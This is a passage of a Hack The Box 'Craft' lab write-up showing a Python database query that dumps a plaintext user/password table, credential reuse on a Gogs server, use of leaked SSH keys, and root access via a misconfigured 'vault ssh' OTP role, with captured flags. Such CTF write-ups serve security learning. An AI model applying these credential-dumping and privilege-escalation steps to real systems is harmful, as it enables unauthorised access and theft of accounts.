<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> connection<span style="color:#f92672">.</span>cursor() <span style="color:#66d9ef">as</span> cursor:
</span></span><span style="display:flex;"><span>        sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;SHOW TABLES&#34;</span>
</span></span><span style="display:flex;"><span>        cursor<span style="color:#f92672">.</span>execute(sql)
</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">=</span> cursor<span style="color:#f92672">.</span>fetchall()
</span></span><span style="display:flex;"><span>        print(result)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">finally</span>:
</span></span><span style="display:flex;"><span>    connection<span style="color:#f92672">.</span>close()
</span></span></code></pre></div><p>Here&rsquo;s what we get for tables in the craft database.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>/opt/app # python hh.py
</span></span><span style="display:flex;"><span>[{&#39;Tables_in_craft&#39;: &#39;brew&#39;}, {&#39;Tables_in_craft&#39;: &#39;user&#39;}]
</span></span></code></pre></div><p>Oh look a <code>user</code> table, let&rsquo;s dump that out and see what we get! Again we replace the sql command, this time to display the entire <code>user</code> table.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> connection<span style="color:#f92672">.</span>cursor() <span style="color:#66d9ef">as</span> cursor:
</span></span><span style="display:flex;"><span>        sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;SELECT * FROM `user`&#34;</span>
</span></span><span style="display:flex;"><span>        cursor<span style="color:#f92672">.</span>execute(sql)
</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">=</span> cursor<span style="color:#f92672">.</span>fetchall()
</span></span><span style="display:flex;"><span>        print(result)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">finally</span>:
</span></span><span style="display:flex;"><span>    connection<span style="color:#f92672">.</span>close()
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>/opt/app # python hh.py
</span></span><span style="display:flex;"><span>[{&#39;id&#39;: 1, &#39;username&#39;: &#39;dinesh&#39;, &#39;password&#39;: &#39;4aUh0A8PbVJxgd&#39;}, {&#39;id&#39;: 4, &#39;username&#39;: &#39;ebachman&#39;, &#39;password&#39;: &#39;llJ77D8QFkLPQB&#39;}, {&#39;id&#39;: 5, &#39;username&#39;: &#39;gilfoyle&#39;, &#39;password&#39;: &#39;ZEU3N8WNM2rh4T&#39;}]
</span></span></code></pre></div><p>Oh my, they&rsquo;re storing passwords in plain text! There must be some credential stuffing we can do with all these.</p>
<p>We already had the credentials for dinesh, but now we&rsquo;ve got the credentials for everyone. It doesn&rsquo;t look like we can ssh in with any of these creds, but let&rsquo;s go back to Gogs and start trying them there. We already know that dinesh reused his password, so maybe the others did too.</p>
<p>It looks like we can login as gilfoyle, and it seems he&rsquo;s got a private repository in his account.</p>
<p><img src="/posts/images/hack-the-box-craft-writeup/private_repo.png" alt="private repository">
<strong>Figure 5:</strong> craft_infra private repo.</p>
<p>When we explore the private <code>craft_infra</code> repository, we see that this crazy dude committed his private and public keys.</p>
<p><img src="/posts/images/hack-the-box-craft-writeup/id_rsa_pub.png" alt="ssh keys">
<strong>Figure 6:</strong> ssh keys inside.</p>
<p>Another really interesting bit of information in this private repo is in <code>craft_infra/vault/secrets.sh</code>.</p>
<p><img src="/posts/images/hack-the-box-craft-writeup/vault_secrets_sh.png" alt="vault secrets">
<strong>Figure 7:</strong> vault secrets!</p>
<p>It appears as though he&rsquo;s running <code>vault</code> as root. Once we get access to the user flag, we&rsquo;ll probably be using this for our privilege escalation to root.</p>
<p>First, let&rsquo;s add the keys we&rsquo;ve found to our own <code>~/.ssh/</code> directory in kali and see if we can get the user flag finally.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:~/.ssh# ssh-add
</span></span><span style="display:flex;"><span>Enter passphrase for /root/.ssh/id_rsa:
</span></span><span style="display:flex;"><span>Identity added: /root/.ssh/id_rsa (gilfoyle@craft.htb)
</span></span><span style="display:flex;"><span>root@kali:~/.ssh# ssh gilfoyle@craft.htb
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>  .   *   ..  . *  *
</span></span><span style="display:flex;"><span>*  * @()Ooc()*   o  .
</span></span><span style="display:flex;"><span>    (Q@*0CG*O()  ___
</span></span><span style="display:flex;"><span>   |\_________/|/ _ \
</span></span><span style="display:flex;"><span>   |  |  |  |  | / | |
</span></span><span style="display:flex;"><span>   |  |  |  |  | | | |
</span></span><span style="display:flex;"><span>   |  |  |  |  | | | |
</span></span><span style="display:flex;"><span>   |  |  |  |  | | | |
</span></span><span style="display:flex;"><span>   |  |  |  |  | | | |
</span></span><span style="display:flex;"><span>   |  |  |  |  | \_| |
</span></span><span style="display:flex;"><span>   |  |  |  |  |\___/
</span></span><span style="display:flex;"><span>   |\_|__|__|_/|
</span></span><span style="display:flex;"><span>    \_________/
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>The programs included with the Debian GNU/Linux system are free software;
</span></span><span style="display:flex;"><span>the exact distribution terms for each program are described in the
</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span></span><span style="display:flex;"><span>permitted by applicable law.
</span></span><span style="display:flex;"><span>Last login: Tue Aug 13 18:45:12 2019 from 10.10.14.167
</span></span><span style="display:flex;"><span>gilfoyle@craft:~$ cat user.txt
</span></span><span style="display:flex;"><span>bbf4b0cadfa3d4e6d0914c9cd5a612d4
</span></span><span style="display:flex;"><span>gilfoyle@craft:~$
</span></span></code></pre></div><p>After adding gilfoyle&rsquo;s keys and using his password once again for <code>ssh-add</code>, you can see we gain the user flag. On to the root portion we go.</p>
<h2 id="root-flag">Root Flag</h2>
<p>Now we already know about something very important, and thats <code>vault</code>. After some research on how to craft the command we&rsquo;re able to easily gain a root shell through this application.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>gilfoyle@craft:/$ vault ssh -mode=otp -role=root_otp root@craft.htb
</span></span><span style="display:flex;"><span>Vault could not locate &#34;sshpass&#34;. The OTP code for the session is displayed
</span></span><span style="display:flex;"><span>below. Enter this code in the SSH password prompt. If you install sshpass,
</span></span><span style="display:flex;"><span>Vault can automatically perform this step for you.
</span></span><span style="display:flex;"><span>OTP for the session is: 60fafe1c-2221-6dd7-d16f-9c6ba0c996eb
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>  .   *   ..  . *  *
</span></span><span style="display:flex;"><span>*  * @()Ooc()*   o  .
</span></span><span style="display:flex;"><span>    (Q@*0CG*O()  ___
</span></span><span style="display:flex;"><span>   |\_________/|/ _ \
</span></span><span style="display:flex;"><span>   |  |  |  |  | / | |
</span></span><span style="display:flex;"><span>   |  |  |  |  | | | |
</span></span><span style="display:flex;"><span>   |  |  |  |  | | | |
</span></span><span style="display:flex;"><span>   |  |  |  |  | | | |
</span></span><span style="display:flex;"><span>   |  |  |  |  | | | |
</span></span><span style="display:flex;"><span>   |  |  |  |  | \_| |
</span></span><span style="display:flex;"><span>   |  |  |  |  |\___/
</span></span><span style="display:flex;"><span>   |\_|__|__|_/|
</span></span><span style="display:flex;"><span>    \_________/
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Password:
</span></span><span style="display:flex;"><span>Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>The programs included with the Debian GNU/Linux system are free software;
</span></span><span style="display:flex;"><span>the exact distribution terms for each program are described in the
</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span></span><span style="display:flex;"><span>permitted by applicable law.
</span></span><span style="display:flex;"><span>Last login: Tue Aug 13 18:48:35 2019 from ::1
</span></span><span style="display:flex;"><span>root@craft:~# cat /root/root.txt
</span></span><span style="display:flex;"><span>831d64ef54d92c1af795daae28a11591
</span></span><span style="display:flex;"><span>root@craft:~#
</span></span></code></pre></div><p>That&rsquo;s all there is!</p>
<p><img src="/posts/images/hack-the-box-craft-writeup/rooted.png" alt="rooted">
<strong>Figure 8:</strong> rooted.</p>
<h1 id="conclusion">Conclusion</h1>
<p>This box was fun from the beginning. I enjoyed going through the <code>Flask</code> code in the <code>git</code> repository to find a vulnerability, as well as finding the credentials and test script in an old commit. This gain of the initial foothold seemed to me to be <strong>very realistic</strong>. I&rsquo;ve seen this type of mistake chain a lot in my years as a developer. Developing the exploit to get code execution was rather difficult (for me at least). Not knowing bash wasn&rsquo;t installed held me up for quite a while on this phase.</p>
<p>I will say that storing credentials in plain text is probably almost as bad, or worse, than using the <code>eval()</code> function, but some people still do this crap too. Running vault as root is also a mistake, but a lazy developer may do too for one reason or another. All in all Craft has been my absolute favorite box thus far.</p>
<h1 id="references">References</h1>
<ol>
<li><a href="http://vipulchaskar.blogspot.com/2012/10/exploiting-eval-function-in-python.html" target="_blank">http://vipulchaskar.blogspot.com/2012/10/exploiting-eval-function-in-python.html</a></li>
<li><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></li>
<li><a href="https://stackoverflow.com/questions/44250002/how-to-solve-sign-and-send-pubkey-signing-failed-agent-refused-operation" target="_blank">https://stackoverflow.com/questions/44250002/how-to-solve-sign-and-send-pubkey-signing-failed-agent-refused-operation</a></li>
<li><a href="https://www.vaultproject.io/docs/commands/ssh.html" target="_blank">https://www.vaultproject.io/docs/commands/ssh.html</a></li>
</ol>

  
  <hr>
<div class="footer">
    
	    
            <a class="previous-post" href="https://ryankozak.com/posts/bad-usb-botnet/?ref=footer"><span style="font-weight:bold;">« Previous</span><br>Bad Usb Botnet</a>
        
	    
            <div class="next-post">
                <a href="https://ryankozak.com/posts/plenty-of-phish-trust-and-gtlds/?ref=footer"><span style="font-weight:bold;">Next »</span><br>Plenty of Phish Trust and Gtlds</a>
            </div>
        
    
</div>

  
</div>
            </main>
            
  

        </div>
    </body>
</html>
